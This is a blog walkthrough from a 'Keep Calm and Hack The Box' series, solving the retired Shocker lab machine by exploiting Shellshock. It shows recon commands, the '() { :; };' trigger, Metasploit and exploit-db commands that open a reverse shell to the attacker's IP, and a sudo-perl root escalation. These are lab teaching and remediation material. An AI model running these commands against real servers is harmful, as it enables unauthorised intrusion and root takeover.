---
title: Keep Calm and Hack The Box - Shocker
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-09-03T06:46:14.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-shocker
coverImage: https://www.freecodecamp.org/news/content/images/2020/09/cyberpunk-neon-city-s0-2560x1440-1.jpg
tags:
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: Linux
  slug: linux
- name: penetration testing
  slug: penetration-testing
seo_title: null
seo_desc: 'Hack The Box (HTB) is an online platform that allows you to test your penetration
  testing skills.

  It contains several challenges that are constantly updated. Some of them simulate
  real world scenarios and some of them lean more towards a CTF style of...'
---

Hack The Box (HTB) is an online platform that allows you to test your penetration testing skills.

It contains several challenges that are constantly updated. Some of them simulate real world scenarios and some of them lean more towards a CTF style of challenge.

**Note**: _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-20.25.05.png)

Shocker demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/):

* nmap
* gobuster
* curl
* searchsploit
* metasploit

Let's get started.

First, I add **Shocker** on the /etc/hosts file.

```bash
nano /etc/hosts
```

with

```bash
10.10.10.56     shocker.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-20.33.53.png)

## **Step 1 - Reconnaissance**

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on this phase to get as much information as you can.

### **Port scanning**

I will use **Nmap** (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing.

It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-20.40.16.png)

I use the following command to perform an intensive scan:

```bash
nmap -A -v shocker.htb
```

**-A:** Enables OS detection, version detection, script scanning, and traceroute

**-v:** Increases verbosity level

**shocker**.htb:**** hostname for the Shocker box

If you find the results a little bit too overwhelming, you can try this:

```bash
nmap shocker.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-20.42.15.png)

We can see that there are 2 open ports including:

**Port** 80, most often used by Hypertext Transfer Protocol (HTTP)

**Port 2222**, EtherNet/IP implicit messaging for IO data

## **Directory scanning**

I use **Gobuster**. Gobuster is a directory scanner written in Go. More info on the tool [here](https://tools.kali.org/web-applications/gobuster). 

Gobuster uses wordlists on Kali which are located in the **/usr/share/wordlists** directory. I'm using wordlists from **dirb** and **dirbuster**, but you can download more wordlists from **SecLists** [here](https://github.com/danielmiessler/SecLists)

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.00.21.png)

I use this command for the dirb common.txt wordlist:

```bash
gobuster dir -u shocker.htb -w /usr/share/wordlists/dirb/common.txt
```

There are a couple of great finds, including **/cgi-bin/**. I do another directory scan with a focus on common extensions (cgi, sh, pl and py):

```bash
gobuster dir -u shocker.htb/cgi-bin -w /usr/share/worldlists/dirb/common.text -x cgi,sh,pl,py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-20.59.28.png)

And I spot something interesting with **/user.sh**.

## **Step 2 -** Understanding Shellshock vulnerability

From the reconnaissance phase, I decide to start with port 80. And I get this page.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.20.19.png)

Not really helpful. 

I curl the page and I can see the script is running some bash.

```bash
curl shocker.htb/cgi-bin/user.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.23.39.png)

I do some research around the machine name and the Linux exploitation system, and come across the [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) vulnerability.

> **Shellshock**, also known as **Bashdoor**, is a family of security bugs in the [Unix](https://en.wikipedia.org/wiki/Unix)[Bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell))shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorised access to many Internet-facing services, such as web servers, that use Bash to process requests - Wikipedia

Shellshock relies on the fact that Bash executes trailing commands when it imports a function definition stored in an environment variable. 

Since these environment variables are not sanitized properly before being executed, an attacker can send commands to a server through HTTP requests and execute them through the web server's operating system.

## **Why does that attack work?**

Shellshock occurs when an attacker modifies the origin HTTP request to contain the following string: `() { :; };`. Bash has special rules for handling a variable starting with this pattern, and will interpret it as a command that needs to be executed.

You can read more on the **National Vulnerability Database**

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.46.12.png)
_[https://nvd.nist.gov/vuln/detail/CVE-2014-6271#vulnCurrentDescriptionTitle](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)_

or have a look at this **OWASP** presentation on this topic

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.47.35.png)
_[https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)_

**F5** also wrote a piece around this exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/08/image-150.png)
_https://f5.com/solutions/mitigation/mitigating-the-bash-shellshock-cve-2014-6271-and-cve-2014-7169-vulnerabilities_

## **Step 3**a **- Exploiting** Bashdoor with Metasploit

We will use **Metasploit**, which is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/" style="box-sizing: inherit; margin: 0px; padding: 0px; border: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; line-height: inherit; font-family: inherit; font-size: 17.6px; vertical-align: baseline; background-color: transparent; color: var(--gray90); text-decoration: underline; cursor: pointer; word-break: break-word;)_

I launch the **Metasploit Framework** on Kali and look for the command I should use for the exploit.

Don't forget to update Metasploit when you launch it with this command:

```bash
msfupdate
```

You can also check if the target is vulnerable to Shellshock on Metasploit using an auxiliary. Start with this command:

```bash
search shellshock
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.04.45.png)

and then

```bash
use 0
```

to select

```bash
auxiliary/scanner/http/apache_mod_cgi_bash_env
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.09.06.png)

You can check the options with

```bash
show options
```

set RHOSTS with

```bash
set RHOSTS shocker.htb
```

and set TARGETURI with

```bash
set TARGETURI /cgi-bin/user.sh
```

Then run the auxiliary with

```bash
check
```

The host is likely to be vulnerable to Shellshock!

Let's now check the exploit with

```bash
use 5
```

or the command

```bash
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

I set the RHOSTS, the TARGETURI, and the LHOST – mine was 10.10.14.28. You will need to set it up with your own LHOST. You can check yours [here](https://www.hackthebox.eu/home/htb/access).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.17.54.png)

I check the options to see if everything is set up correctly.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-23.03.45.png)

I then run the exploit with

```bash
run
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-23.08.16.png)

I get a **Meterpreter** session.

Here's the definition of Meterpreter from [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/):

> Meterpreter is an advanced, dynamically extensible payload that uses _in-memory_ DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

You can read more about Meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

Let's start by gathering some information.

**getuid** returns the real user ID of the calling process.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-23.09.00.png)

## **Step** 3b **- Exploiting** Bashdoor without **Metasploit**

I use **Searchsploit** to check if there is any known exploit. Searchsploit is a command line search tool for [Exploit Database](https://www.exploit-db.com/).

I use the following command:

```bash
searchsploit shellshock
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.55.43.png)

I get more details on an exploit with:

```bash
searchsploit -x 34900.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-07.33.58.png)

You can also check the **Exploit Database** to find the same exploit.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-07.33.23.png)
_[https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com/exploits/34900)_

I get more information with:

```bash
searchsploit -p 34900.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-07.41.16.png)

I can see where it is located on my Kali box. I copy the file in my Shocker folder with

```bash
cp /usr/share/exploitdb/exploits/linux/remote/34900.py .
```

and to check if it has been copied in this folder

```bash
ls -la
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-07.41.39.png)

I then set up the exploit with

```bash
python 34900.py payload=reverse rhost=shocker.htb lhost=10.10.14.4 lport=1234 pages=/cgi-bin/user.sh
```

I set the payload to reverse for a TCP reverse shell and it requires setting up the rhost, the lost, and the lport.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-21.44.01.png)

I get a shell!

## **Step** 4 **-** Looking for the user.txt flag

I navigate to the **shelly** folder from **home**.

I can list all the files/folders with the following command:

```bash
ls -la
```

I then move to the **home** folder with

```bash
cd home
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.21.00.png)

And I find the user flag! I check the contents of the file with

```bash
cat user.txt
```

## **Step 5 -** Looking for the root.txt flag

I try to navigate to the **root** folder. Access is denied. We need to perform privilege escalation.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.22.42.png)

I type the following command to get a standard shell on the target system

```bash
shell
```

I spawn a TTY shell with

```bash
python3 -c "import pty; pty.spawn('/bin/bash/');"
```

I need to change to the root user to access this folder. I use the command

```bash
sudo -l
```

to understand which command I can run on localhost.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.26.07.png)

I find that the user Shelly can execute the Perl command as “root” without a password. I perform a Perl privilege escalation with

```bash
sudo perl -e 'exec "/bin/bash";'
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.30.41.png)

I am now root! I can navigate to the **root** folder. I find the root.txt file and check its content with

```bash
cat root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.31.32.png)

Congrats! You found both flags.

## **Remediations**

* Upgrade Bash to a version that doesn't interpret `() { :; };` in a special way
* Patch your servers!

Please don’t hesitate to comment, ask questions, or share with your friends :)

You can see more articles from the series **Keep Calm and Hack the Box** [here](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box).

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

![Image](https://www.freecodecamp.org/news/content/images/2020/09/cyberpunk-neon-city-s0-2560x1440.jpg)

